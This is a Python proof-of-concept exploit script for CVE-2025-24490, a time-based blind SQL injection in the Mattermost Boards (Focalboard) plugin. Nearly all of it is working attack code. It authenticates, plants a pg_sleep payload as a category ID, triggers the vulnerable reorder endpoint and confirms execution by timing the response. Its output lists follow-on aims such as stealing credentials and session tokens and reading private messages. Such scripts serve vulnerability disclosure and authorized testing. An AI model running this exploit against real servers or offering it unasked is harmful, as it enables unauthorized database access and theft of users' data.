#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Mattermost Boards Plugin — Blind SQL Injection via Category Reorder
# CVE            : CVE-2025-24490
# Vendor         : Mattermost
# Product        : Mattermost Server (Boards / Focalboard Plugin)
# Affected       : Mattermost ≤ 10.4.1, ≤ 9.11.7; Boards Plugin ≤ v9.0.4
# Fixed          : 10.4.2, 9.11.8; Boards Plugin v9.0.5
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-24490 — Time-based blind SQL injection via reorderCategories.

ATTACK CHAIN:
    1. Authenticate as any team member
    2. Create a category with SQL injection payload as its ID
    3. List all categories (to build the required reorder array)
    4. Trigger reorder — payload executes in CASE WHEN expression
    5. Measure response time — delay proves arbitrary SQL execution

PREREQUISITES:
    - Mattermost Server ≤ 9.11.7 (or ≤ 10.4.1, ≤ 10.3.2, ≤ 10.2.2)
    - Focalboard plugin enabled
    - Valid user credentials (any team member)

REFERENCES:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-24490
    - https://github.com/advisories/GHSA-p4jg-qmjv-9x26
"""

import sys
import json
import time
import http.client
import urllib.parse


# ─── Configuration ──────────────────────────────────────────────────────────
DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8065
ADMIN_USER = "admin"
ADMIN_PASS = "Admin123!@#"

# Time-based blind SQLi payload (34 chars, fits varchar(36))
# When concatenated by vulnerable code: WHEN ''||(SELECT '' FROM pg_sleep(N))||'' THEN ...
SLEEP_SECONDS = 5
SQLI_PAYLOAD = f"'||(SELECT '' FROM pg_sleep({SLEEP_SECONDS}))||'"

# Detection threshold: if response takes > SLEEP_SECONDS - 1, injection confirmed
DETECTION_THRESHOLD = SLEEP_SECONDS - 1


class MattermostClient:
    """Minimal Mattermost API client using only stdlib."""

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.token = None
        self.user_id = None
        self.team_id = None

    def _request(self, method, path, body=None, extra_headers=None):
        """Make an HTTP request and return (status, headers, body_dict)."""
        conn = http.client.HTTPConnection(self.host, self.port, timeout=30)
        headers = {"Content-Type": "application/json"}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        if extra_headers:
            headers.update(extra_headers)

        data = json.dumps(body).encode() if body else None
        conn.request(method, path, body=data, headers=headers)
        resp = conn.getresponse()
        status = resp.status
        resp_headers = dict(resp.getheaders())
        raw = resp.read().decode()
        conn.close()

        try:
            resp_body = json.loads(raw) if raw else {}
        except json.JSONDecodeError:
            resp_body = {"raw": raw}

        return status, resp_headers, resp_body

    def _boards_request(self, method, path, body=None):
        """Make a request to the boards/focalboard API with required CSRF header."""
        return self._request(method, path, body,
                             extra_headers={"X-Requested-With": "XMLHttpRequest"})

    def login(self, username, password):
        """Authenticate and store the session token."""
        print(f"[*] Logging in as '{username}'...")
        status, headers, body = self._request("POST", "/api/v4/users/login",
                                              {"login_id": username, "password": password})
        if status != 200:
            print(f"[-] Login failed (HTTP {status}): {body}")
            return False

        # Token is in response headers (case-insensitive search)
        self.token = None
        for k, v in headers.items():
            if k.lower() == "token":
                self.token = v
                break

        if not self.token:
            print("[-] No token in response headers")
            return False

        self.user_id = body.get("id")
        print(f"[+] Login successful! User ID: {self.user_id}")
        print(f"[+] Token: {self.token[:10]}...")
        return True

    def get_teams(self):
        """Get teams the user belongs to."""
        status, _, body = self._request("GET", "/api/v4/users/me/teams")
        if status != 200:
            print(f"[-] Failed to get teams (HTTP {status})")
            return []
        return body

    def get_categories(self, team_id):
        """Get board categories for the current user in a team."""
        path = f"/plugins/focalboard/api/v2/teams/{team_id}/categories"
        status, _, body = self._boards_request("GET", path)
        if status != 200:
            print(f"[-] Failed to get categories (HTTP {status}): {body}")
            return []
        return body

    def create_category(self, team_id, category_id, name="test"):
        """Create a board category with a specified ID (user-controlled in vulnerable version)."""
        path = f"/plugins/focalboard/api/v2/teams/{team_id}/categories"
        payload = {
            "id": category_id,
            "name": name,
            "userID": self.user_id,
            "teamID": team_id,
            "type": "custom",
        }
        status, _, body = self._boards_request("POST", path, payload)
        return status, body

    def reorder_categories(self, team_id, category_ids):
        """
        Reorder categories — this is the VULNERABLE endpoint.
        The category IDs are concatenated into a SQL CASE WHEN expression.
        """
        path = f"/plugins/focalboard/api/v2/teams/{team_id}/categories/reorder"
        status, _, body = self._boards_request("PUT", path, category_ids)
        return status, body


def exploit(target_host, target_port):
    """
    Demonstrate CVE-2025-24490 time-based blind SQL injection.

    Attack flow:
    1. Authenticate as a regular user
    2. Get team ID
    3. Create a category with SQL injection payload as its ID
    4. List all categories (to get the full set including system categories)
    5. Trigger reorder with all category IDs (including the malicious one)
    6. Measure response time — a delay proves arbitrary SQL execution
    """
    client = MattermostClient(target_host, target_port)

    # ── Step 1: Authenticate ────────────────────────────────────────────────
    if not client.login(ADMIN_USER, ADMIN_PASS):
        print("[-] FAILED: Could not authenticate")
        return False

    # ── Step 2: Get team ID ─────────────────────────────────────────────────
    print("[*] Getting team memberships...")
    teams = client.get_teams()
    if not teams:
        print("[-] FAILED: User has no team memberships")
        return False
    client.team_id = teams[0]["id"]
    print(f"[+] Using team: {teams[0].get('display_name', 'unknown')} ({client.team_id})")

    # ── Step 3: Create category with SQL injection payload ──────────────────
    print(f"\n[*] Creating category with SQL injection payload as ID...")
    print(f"    Payload: {SQLI_PAYLOAD}")
    print(f"    Length:  {len(SQLI_PAYLOAD)} chars (max: 36 for varchar(36))")

    status, body = client.create_category(client.team_id, SQLI_PAYLOAD, name="sqli-poc")
    if status == 200:
        print(f"[+] Category created with malicious ID (HTTP {status})")
    else:
        # May already exist from a previous run
        print(f"[!] Category creation returned HTTP {status}: {body}")
        err_id = body.get("id", "") if isinstance(body, dict) else ""
        if "already exists" in str(body) or status == 500:
            print("[!] Category may already exist, continuing...")
        else:
            print("[!] Continuing anyway — the payload may already be stored")

    # ── Step 4: List all categories ─────────────────────────────────────────
    print("\n[*] Listing all categories for user+team...")
    categories = client.get_categories(client.team_id)
    if not categories:
        print("[-] FAILED: No categories found")
        return False

    category_ids = [c["id"] for c in categories]
    print(f"[+] Found {len(category_ids)} categories:")
    for cat in categories:
        cat_id = cat['id']
        marker = " <<< INJECTED" if cat_id == SQLI_PAYLOAD else ""
        print(f"    - {cat['name']}: {cat_id}{marker}")

    if SQLI_PAYLOAD not in category_ids:
        print("[-] FAILED: Malicious category ID not found in category list")
        print("    The server may have rejected or modified the ID")
        return False

    # ── Step 5: Trigger SQL injection via reorder ───────────────────────────
    print(f"\n[*] Triggering SQL injection via category reorder...")
    print(f"    Endpoint: PUT /plugins/focalboard/api/v2/teams/{{teamID}}/categories/reorder")
    print(f"    Payload array contains {len(category_ids)} IDs (all required)")
    print(f"    Expected delay: ~{SLEEP_SECONDS} seconds (pg_sleep({SLEEP_SECONDS}))")
    print(f"    Sending request...")

    start_time = time.time()
    status, body = client.reorder_categories(client.team_id, category_ids)
    elapsed = time.time() - start_time

    print(f"\n[*] Response received:")
    print(f"    HTTP Status:  {status}")
    print(f"    Elapsed time: {elapsed:.2f} seconds")

    # ── Step 6: Analyze results ─────────────────────────────────────────────
    print("\n" + "=" * 60)
    if elapsed >= DETECTION_THRESHOLD:
        print(f"[+] SQL INJECTION CONFIRMED!")
        print(f"    Response was delayed by {elapsed:.2f}s (threshold: {DETECTION_THRESHOLD}s)")
        print(f"    pg_sleep({SLEEP_SECONDS}) executed successfully in database context")
        print(f"")
        print(f"    The attacker can execute arbitrary SQL queries including:")
        print(f"    - Extract user credentials from the Users table")
        print(f"    - Steal active session tokens from the Sessions table")
        print(f"    - Read all private messages from Posts/Channels")
        print(f"    - Escalate to system admin via session hijacking")
        print("=" * 60)
        return True
    else:
        print(f"[-] SQL INJECTION NOT CONFIRMED")
        print(f"    Response took {elapsed:.2f}s (expected >= {DETECTION_THRESHOLD}s)")
        print(f"    HTTP {status}: {body}")
        print("=" * 60)
        return False


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    print("=" * 60)
    print("  CVE-2025-24490 PoC: SQL Injection in Mattermost Boards")
    print("  Vector: reorderCategories (time-based blind)")
    print(f"  Target: {host}:{port}")
    print("=" * 60)
    print()
    success = exploit(host, port)
    sys.exit(0 if success else 1)
